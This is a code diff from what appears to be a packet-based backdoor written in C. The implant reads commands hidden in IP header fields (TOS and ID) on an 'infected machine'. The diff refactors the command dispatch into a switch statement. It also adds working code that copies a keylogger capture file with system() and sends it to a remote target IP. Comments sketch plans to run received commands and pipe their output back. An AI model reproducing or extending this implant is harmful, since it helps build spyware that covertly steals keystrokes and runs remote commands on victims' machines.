@@ -161,35 +161,49 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
             char ch[1];
             ch[0] = (char)ip->ip_ttl;
 
-            if((fwrite(ch, sizeof(char), sizeof(char), fp)) <= 0){
+            if(fwrite(ch, sizeof(char), sizeof(char), fp) <= 0){
                 perror("fwrite");
                 exit(1);
             }
         }
     //infected machine receiving a command
     } else if(Filter->infected == true) {
-        if(CheckKey(ip->ip_tos, ip->ip_id) == COMMAND){
-            printf("COMMAND\n");
-            //write command to .cmd
-            //CHMOD it
-            //run the file and pipe to results file
-        } else if(CheckKey(ip->ip_tos, ip->ip_id) == KEYLOGGER) {
-            printf("KEYLOGGER\n");
-            //copy keylogger file to results file
-        } else if(CheckKey(ip->ip_tos, ip->ip_id) == INOTIFY) {
-            printf("INOTIFY\n");
-            //copy inotify file to results file
-        } else if(CheckKey(ip->ip_tos, ip->ip_id) == EOT) {
-            printf("EOT\n");
-            //EOT, stop receiving and start sending
-        } else if(CheckKey(ip->ip_tos, ip->ip_id) == UDPCOMMAND) {
-            printf("UDP\n");
-            //EOT, stop receiving and start sending
+        switch(CheckKey(ip->ip_tos, ip->ip_id)) {
+            case COMMAND:
+                printf("COMMAND\n");
+                //write command to .cmd
+                break;
+            case KEYLOGGER:
+                printf("KEYLOGGER\n");
+                //copy keylogger file to results file
+                system("cp .keylogger.txt .results");
+                send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp);
+                break;
+            case INOTIFY:
+                printf("INOTIFY\n");
+                //write to inotify file
+                break;
+            case UDPCOMMAND:
+                printf("UDP\n");
+                //EOT, stop receiving and start sending
+                break;
+            case EOT:
+                printf("EOT\n");
+                //EOT, stop receiving and start sending
+
+                //if inotify
+                    //start inotify
+                    //when completed, copy inotify file to results file
+                //if command
+                    //CHMOD it
+                    //run the file and pipe to results file
+                break;
+            default:
+                printf("DEBUG: Packet tossed wrong key\n");
+                break;
         }
 
         //send results file
-    } else {
-        printf("DEBUG: Packet tossed wrong key\n");
     }
 
     fclose(fp);
